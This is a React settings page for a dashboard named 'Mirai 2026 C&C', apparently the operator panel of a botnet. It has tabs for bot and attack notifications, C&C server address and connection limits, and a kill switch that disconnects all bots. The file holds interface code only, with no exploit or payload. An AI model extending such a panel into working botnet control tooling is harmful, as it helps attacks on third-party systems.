'use client';

import { useState } from 'react';
import { Navbar } from '@/components/shared';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, Button, Input, ThemeSwitcher } from '@/components/ui';

type Tab = 'general' | 'appearance' | 'notifications' | 'network' | 'danger';

const TABS: { id: Tab; label: string }[] = [
  { id: 'general',       label: 'General' },
  { id: 'appearance',    label: 'Appearance' },
  { id: 'notifications', label: 'Notifications' },
  { id: 'network',       label: 'Network' },
  { id: 'danger',        label: 'Danger Zone' },
];

export default function SettingsPage() {
  const [activeTab, setActiveTab] = useState<Tab>('general');

  const [notifications, setNotifications] = useState({
    botConnected: true,
    botDisconnected: true,
    attackCompleted: true,
    attackFailed: false,
    systemAlerts: true,
  });

  const [autoRefresh, setAutoRefresh] = useState(true);
  const [refreshInterval, setRefreshInterval] = useState(5);

  return (
    <div className="min-h-screen bg-primary-bg">
      <Navbar />

      <main className="pt-20 px-4 sm:px-6 lg:px-8 max-w-5xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-display font-bold neon-text mb-2">
            Settings
          </h1>
          <p className="text-text-secondary">
            Configure your dashboard preferences
          </p>
        </div>

        {/* Tab Bar */}
        <div className="flex space-x-1 mb-6 border-b border-white/10">
          {TABS.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-4 py-2 text-sm font-medium transition-all border-b-2 -mb-px ${
                activeTab === tab.id
                  ? 'border-accent-primary text-accent-primary'
                  : 'border-transparent text-text-muted hover:text-text-secondary hover:border-white/20'
              } ${tab.id === 'danger' ? 'ml-auto text-accent-danger hover:text-accent-danger hover:border-accent-danger/50' : ''}`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        <div className="space-y-6">
          {/* ── General ── */}
          {activeTab === 'general' && (
            <>
              <Card variant="elevated">
                <CardHeader>
                  <CardTitle>General</CardTitle>
                  <CardDescription>Basic dashboard configuration</CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <Input
                      label="Dashboard Title"
                      defaultValue="Mirai 2026 C&C"
                      placeholder="Dashboard name"
                    />
                    <Input
                      label="Organization"
                      defaultValue="Security Research Lab"
                      placeholder="Your organization"
                    />
                  </div>

                  <div className="flex items-center justify-between glass-card p-4 rounded-lg">
                    <div>
                      <div className="text-sm font-medium text-text-primary">Auto Refresh</div>
                      <div className="text-xs text-text-muted">Automatically update dashboard data</div>
                    </div>
                    <button
                      onClick={() => setAutoRefresh(!autoRefresh)}
                      className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                        autoRefresh ? 'bg-accent-primary' : 'bg-white/10'
                      }`}
                    >
                      <span
                        className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                          autoRefresh ? 'translate-x-6' : 'translate-x-1'
                        }`}
                      />
                    </button>
                  </div>

                  {autoRefresh && (
                    <div>
                      <label className="block text-sm font-medium text-text-secondary mb-2">
                        Refresh Interval (seconds)
                      </label>
                      <input
                        type="range"
                        min="1"
                        max="60"
                        value={refreshInterval}
                        onChange={(e) => setRefreshInterval(parseInt(e.target.value))}
                        className="w-full h-2 bg-white/10 rounded-lg appearance-none cursor-pointer accent-accent-primary"
                      />
                      <div className="flex justify-between text-xs text-text-muted mt-1">
                        <span>1s</span>
                        <span className="text-accent-primary font-mono">{refreshInterval}s</span>
                        <span>60s</span>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Security (kept under General as no dedicated tab) */}
              <Card variant="elevated">
                <CardHeader>
                  <CardTitle>Security</CardTitle>
                  <CardDescription>Authentication and access control</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Input
                    label="Current Password"
                    type="password"
                    placeholder="Enter current password"
                  />
                  <Input
                    label="New Password"
                    type="password"
                    placeholder="Enter new password"
                  />
                  <Input
                    label="Confirm New Password"
                    type="password"
                    placeholder="Confirm new password"
                  />
                  <Button variant="primary" size="sm">
                    Update Password
                  </Button>

                  <div className="border-t border-white/10 pt-4 mt-6">
                    <div className="flex items-center justify-between glass-card p-4 rounded-lg">
                      <div>
                        <div className="text-sm font-medium text-text-primary">Two-Factor Authentication</div>
                        <div className="text-xs text-text-muted">Add an extra layer of security</div>
                      </div>
                      <Button variant="secondary" size="sm">
                        Enable
                      </Button>
                    </div>
                  </div>

                  <div className="flex items-center justify-between glass-card p-4 rounded-lg">
                    <div>
                      <div className="text-sm font-medium text-text-primary">API Key</div>
                      <div className="text-xs text-text-muted font-mono">sk-mirai-************************</div>
                    </div>
                    <Button variant="ghost" size="sm">
                      Regenerate
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </>
          )}

          {/* ── Appearance ── */}
          {activeTab === 'appearance' && (
            <Card variant="elevated">
              <CardHeader>
                <CardTitle>Appearance</CardTitle>
                <CardDescription>Theme, font size, layout density, and accent color</CardDescription>
              </CardHeader>
              <CardContent>
                <ThemeSwitcher />
              </CardContent>
            </Card>
          )}

          {/* ── Notifications ── */}
          {activeTab === 'notifications' && (
            <Card variant="elevated">
              <CardHeader>
                <CardTitle>Notifications</CardTitle>
                <CardDescription>Configure alert preferences</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {Object.entries(notifications).map(([key, value]) => (
                  <div key={key} className="flex items-center justify-between glass-card p-4 rounded-lg">
                    <div>
                      <div className="text-sm font-medium text-text-primary capitalize">
                        {key.replace(/([A-Z])/g, ' $1').trim()}
                      </div>
                      <div className="text-xs text-text-muted">
                        {key === 'botConnected'    && 'Alert when a new bot connects'}
                        {key === 'botDisconnected' && 'Alert when a bot goes offline'}
                        {key === 'attackCompleted' && 'Alert when an attack finishes successfully'}
                        {key === 'attackFailed'    && 'Alert when an attack fails'}
                        {key === 'systemAlerts'    && 'Critical system notifications'}
                      </div>
                    </div>
                    <button
                      onClick={() => setNotifications(prev => ({ ...prev, [key]: !value }))}
                      className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                        value ? 'bg-accent-primary' : 'bg-white/10'
                      }`}
                    >
                      <span
                        className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                          value ? 'translate-x-6' : 'translate-x-1'
                        }`}
                      />
                    </button>
                  </div>
                ))}
              </CardContent>
            </Card>
          )}

          {/* ── Network ── */}
          {activeTab === 'network' && (
            <Card variant="elevated">
              <CardHeader>
                <CardTitle>Network Configuration</CardTitle>
                <CardDescription>C&amp;C server settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <Input
                    label="C&C Server Address"
                    defaultValue="192.168.1.100"
                    placeholder="Server IP"
                  />
                  <Input
                    label="Port"
                    defaultValue="8080"
                    type="number"
                    placeholder="Port number"
                  />
                  <Input
                    label="Max Connections"
                    defaultValue="1000"
                    type="number"
                    placeholder="Maximum connections"
                  />
                  <Input
                    label="Timeout (seconds)"
                    defaultValue="30"
                    type="number"
                    placeholder="Connection timeout"
                  />
                </div>
              </CardContent>
            </Card>
          )}

          {/* ── Danger Zone ── */}
          {activeTab === 'danger' && (
            <Card variant="bordered" className="border-accent-danger/30">
              <CardHeader>
                <CardTitle className="text-accent-danger">Danger Zone</CardTitle>
                <CardDescription>Irreversible actions</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between glass-card p-4 rounded-lg border border-accent-danger/20">
                  <div>
                    <div className="text-sm font-medium text-text-primary">Clear All Data</div>
                    <div className="text-xs text-text-muted">Delete all bots, attacks, and logs</div>
                  </div>
                  <Button variant="danger" size="sm">
                    Clear Data
                  </Button>
                </div>

                <div className="flex items-center justify-between glass-card p-4 rounded-lg border border-accent-danger/20">
                  <div>
                    <div className="text-sm font-medium text-text-primary">Disconnect All Bots</div>
                    <div className="text-xs text-text-muted">Force disconnect all connected bots</div>
                  </div>
                  <Button variant="danger" size="sm">
                    Disconnect All
                  </Button>
                </div>

                <div className="flex items-center justify-between glass-card p-4 rounded-lg border border-accent-danger/20">
                  <div>
                    <div className="text-sm font-medium text-text-primary">Kill Switch</div>
                    <div className="text-xs text-text-muted">Emergency shutdown of all operations</div>
                  </div>
                  <Button variant="danger" size="sm">
                    Activate Kill Switch
                  </Button>
                </div>

                <div className="flex items-center justify-between glass-card p-4 rounded-lg border border-accent-danger/20">
                  <div>
                    <div className="text-sm font-medium text-text-primary">Reset to Factory Defaults</div>
                    <div className="text-xs text-text-muted">Reset all settings to default values</div>
                  </div>
                  <Button variant="danger" size="sm">
                    Factory Reset
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Save / Cancel (not shown on Danger Zone — actions are self-contained) */}
          {activeTab !== 'danger' && (
            <div className="flex justify-end space-x-4 pb-8">
              <Button variant="ghost">Cancel</Button>
              <Button variant="primary">Save Changes</Button>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="text-center py-8 text-text-muted text-sm">
          <p>Settings - Mirai 2026</p>
        </div>
      </main>
    </div>
  );
}
